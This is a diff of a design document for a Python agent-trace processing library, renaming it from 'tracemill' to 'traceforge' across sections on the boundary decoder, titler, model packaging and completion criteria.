-- **Model resolution.** Explicit argument → `$TRACEMILL_PHASE_MODEL` → the packaged
+  `traceforge.tracking.PhaseTracker` is a **research feature signal, not part of the live path.**
+- **Model resolution.** Explicit argument → `$TRACEFORGE_PHASE_MODEL` → the packaged
   `phase/data/phase-model.joblib`.
 
-### 23.3 — Boundary decoder (`src/tracemill/boundary/`)
+### 23.3 — Boundary decoder (`src/traceforge/boundary/`)
 
 Stamps `metadata.boundary` live, yielding an activity / step table of contents.
 
 - **Classes.** A single-label per-**gap** classifier over `noise`, `activity-boundary`, `step-boundary`.
-- **Features.** Feature set `combined-seg`, built by the **shared** `tracemill.phase.features` over the
+- **Features.** Feature set `combined-seg`, built by the **shared** `traceforge.phase.features` over the
   gap between event *t* and its successor *t+1* (symbolic change indicators for both events + their
   model2vec embeddings + the causal BOCPD / majority-vote signals).
 - **Causality.** The gap after event *t* is decided only once *t+1* arrives; the boundary is stamped on
@@ -1999,7 +1999,7 @@ Stamps `metadata.boundary` live, yielding an activity / step table of contents.
   (activity before step). Decoding is O(1) per gap; with no `decode_params` it falls back to argmax.
 - **Model.** Packaged `boundary/data/boundary-model.joblib`.
 
-### 23.4 — Titler (`src/tracemill/title/`)
+### 23.4 — Titler (`src/traceforge/title/`)
 
 Produces human-readable activity / step titles, emitted **out-of-band**.
 
@@ -2054,13 +2054,13 @@ distilled request-head was measured at ~9% coherent and dropped).
 
 ### 23.7 — Packaging
 
-The base `tracemill` wheel is **model-free only for the titler.** Its build force-includes the small model
+The base `traceforge` wheel is **model-free only for the titler.** Its build force-includes the small model
 artifacts — `phase/data/*.joblib`, `phase/data/potion-base-8M/*`, `boundary/data/*.joblib`, and
 `title/data/*.json` — so the **phase and boundary sklearn heads and the frozen model2vec embedder ship in
 the base wheel.** Only the large T5 titler weights are split out, into a separate distribution
-**`tracemill-title-model`** (`encoder.onnx` / `decoder.onnx` / `tokenizer.json`). That distribution is a
-**hard runtime dependency** (`tracemill-title-model >= 0.2` in `[project.dependencies]`), **not** an
-optional extra. `title/_resolve.py::span_dir()` resolves the weights as: installed `tracemill_title_model`
+**`traceforge-title-model`** (`encoder.onnx` / `decoder.onnx` / `tokenizer.json`). That distribution is a
+**hard runtime dependency** (`traceforge-title-model >= 0.2` in `[project.dependencies]`), **not** an
+optional extra. `title/_resolve.py::span_dir()` resolves the weights as: installed `traceforge_title_model`
 package → in-tree `title/data/` dev fallback → raise with an install hint. Git-LFS pointer stubs are
 rejected via a minimum-byte-size guard, so a partial checkout fails loudly instead of loading a stub.
 
@@ -2071,12 +2071,12 @@ rejected via a minimum-byte-size guard, so a partial checkout fails loudly inste
 The library is "done" when:
 
 1. **Three sink implementations** (SQLite, JSONL, Callback) are production-quality with tests
-2. **CLI runner** can start all pipelines from `tracemill.yaml` and run indefinitely
+2. **CLI runner** can start all pipelines from `traceforge.yaml` and run indefinitely
 3. **Any JSONL-emitting framework** can be added with only a YAML file (no code)
 4. **Non-JSONL frameworks** (Copilot SQLite, Aider markdown) work via parser + mapping
 5. **Classification** is stable: tool taxonomy covers 95%+ of observed tool calls without `unknown`
 6. **Risk scoring** produces meaningful differentiation (not all-50s)
 7. **End-to-end latency** from event ingestion to sink write is < 10ms p99 for in-memory sinks
 8. **Zero-crash guarantee**: malformed input, failed sinks, and unexpected data never crash the pipeline
-9. **Config bootstrap**: first `pip install tracemill` + any config access creates `~/.tracemill/` with working defaults
+9. **Config bootstrap**: first `pip install traceforge` + any config access creates `~/.traceforge/` with working defaults
 10. **CI green**: lint + tests pass on Python 3.11, 3.12, 3.13
